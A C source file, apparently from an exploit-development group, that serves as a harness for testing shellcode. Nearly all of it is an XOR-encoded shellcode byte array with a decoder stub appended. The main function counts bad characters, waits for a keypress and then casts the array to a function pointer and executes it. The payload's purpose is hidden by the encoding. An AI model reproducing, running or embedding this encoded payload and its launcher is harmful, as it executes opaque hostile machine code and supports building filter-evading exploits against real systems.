#include <stdio.h>
#include <string.h>

/* 
                  _     __             _____                     
  /\  /\__ _  ___| | __/ _\_   _ ___  /__   \___  __ _ _ __ ___  
 / /_/ / _` |/ __| |/ /\ \| | | / __|   / /\/ _ \/ _` | '_ ` _ \ 
/ __  / (_| | (__|   < _\ \ |_| \__ \  / / |  __/ (_| | | | | | |
\/ /_/ \__,_|\___|_|\_\\__/\__, |___/  \/   \___|\__,_|_| |_| |_|
                           |___/                                 

                                http://hacksys.vfreaks.com/
                                  hacksysteam@hotmail.com

Module Name:

    Shellcode Test Encoded

Abstract:
    
    This program is used as a template to test 
    C style formatted shellcodes. A decoder is
	already added to the final shellcode output.
    
IDE: 
     
    Dev-C++ 4.9.9.2 (Windows XP SP3)
        
Compiler: 
          
    gcc 3.4.2

*/

unsigned char shellcode[] = 
"\x68\xaa\x3a\x3a\x3a\x68\xea\xf7\x68\xa6\x68"
"\x23\x4f\x9b\x6a\x68\xaa\xaa\xaa\xff\x68\xaa"
"\xcf\xaa\xee\x68\xaa\xdd\xaa\xe4\x68\xaa\xaa"
"\xaa\xfa\x68\xaa\xec\xaa\xf9\x68\xaa\xe4\xaa"
"\xfe\x68\xaa\xf6\xaa\xaa\x68\xaa\xe9\xaa\x90"
"\x68\xaa\x84\xaa\xf6\x68\x55\xf6\xaa\xf6\x68"
"\x42\xd7\x55\x55\x68\xf7\xba\x55\x79\x68\x27"
"\xc0\xaa\x21\x68\xec\xa2\xab\x48\x68\x79\x23"
"\x53\x29\x68\x21\xf7\xae\x55\x68\x62\xaa\xaa"
"\xaa\x68\xaa\x55\x79\xc2\x68\xa2\xfa\x21\xf7"
"\x68\xc0\xa6\x27\xec\x68\xaa\xaa\xaa\xfa\x68"
"\xfa\x27\x2c\xba\x68\xb0\xaa\xaa\xaa\x68\xc0"
"\xab\x27\x2c\x68\xaa\xba\xaa\xaa\x68\xaa\xaa"
"\xfa\xc2\x68\x27\x2c\x8c\xaa\x68\xf7\xa6\x55"
"\x79\x68\xde\x8e\xae\x21\x68\xa2\x55\x79\x55"
"\x68\xaa\xfa\x21\xf7\x68\xc2\x8a\xaa\xa3\x68"
"\xf8\xf8\xf8\xf8\x68\xf6\x8e\xae\xf9\x68\x9b"
"\x78\xf8\x27\x68\xfa\x29\x46\xae\x68\xf7\xbe"
"\x55\x79\x68\xaa\x6a\xfc\x21\x68\xa9\xc2\xaa"
"\xaa\x68\xc0\xa9\xf8\xc0\x68\x9b\x78\xf8\xf8"
"\x68\xbd\xf3\x23\x65\x68\x41\xd4\xf4\xc0\x68"
"\xce\xc6\xc6\xaa\x68\xc3\xcc\xd9\x84\x68\x55"
"\x55\xcc\xc7\x68\xa5\x42\x75\x55\x68\x4a\x23"
"\x4f\x41\x68\xf3\xfa\xed\x48\x68\xc1\x55\x55"
"\x55\x68\xe6\x17\xaa\x42\x68\x68\xf3\xfb\x21"
"\x68\xb6\x55\x7a\x23\x68\xb6\x21\xee\x8e\x68"
"\xdf\xa6\xfb\x41\x68\x55\x29\x53\xab\x68\xc0"
"\xad\xf3\x9b\x68\xb0\x99\x23\x4f\x68\x65\xc2"
"\x76\x77\x68\xc2\xac\x4f\x1a\x68\x2d\x25\xec"
"\x46\x68\x3a\xc8\x7d\xc2\x68\x9e\x91\xc2\x3c"
"\x68\xaf\xc2\x0d\x7e\x68\xc2\xba\x0b\xcd\x68"
"\xce\xf1\xa8\x01\x68\xb2\xdf\x59\xc2\x68\x21"
"\xaa\x90\xe5\x68\xa2\x21\xd2\x8a\x68\xea\xb6"
"\x21\xfa\x68\x21\xea\xa6\x21\x68\x9a\xaa\xaa"
"\xaa\x68\x9b\x63\xce\x0b\x68\x27\xae\xa8\x69"
"\x68\xb0\x21\xae\x29\x68\xf1\xb6\x27\xb6\x68"
"\x55\xaa\xaa\x21\x68\xae\xeb\x8f\x55\x68\xa6"
"\xa0\xcc\x21\x68\x21\xe1\x8e\x27\x68\x55\x55"
"\x55\xf1\x68\xb6\xa8\x42\x69\x68\x21\xea\x8a"
"\x27\x68\x27\xae\xa8\xfa\x68\x21\xee\xa8\xd2"
"\x68\x7a\x21\xea\x96\x68\x41\x74\x69\x23\x68"
"\xf1\xde\xa9\xea\x68\xaf\x93\x61\xf2\x68\xdf"
"\x59\x6b\x61\x68\x69\x29\x52\xaa\x68\x6b\x69"
"\xaf\xab\x68\x71\x9b\x6a\x06\x68\x7c\xf9\xfa"
"\x9b\x68\x21\x9e\x29\xab\x68\x41\xf0\x9b\x6a"
"\x89\xe6\x31\xc9\xb1\x63\xbb\xaa\xaa\xaa\xaa"
"\x31\x1e\x83\xc6\x04\xe2\xf9\xff\xe4";


main()
{

    int i, badchar_c = 0;
	
    printf("\n\nShellcode Length: %d\n", sizeof(shellcode)-1);
	
    for(i = 0; i < sizeof(shellcode)-1; ++i) {
          if(((unsigned char *)shellcode)[i] == 0x00) {
                        badchar_c = badchar_c + 1;
          }
    }
    printf("\nNumber of badchar: %d\n\n", badchar_c);
	
    printf("\nPress any key to execute shellcode....\n\n");

    getch();

    int (*ret)() = (int(*)())shellcode;

    ret();

}
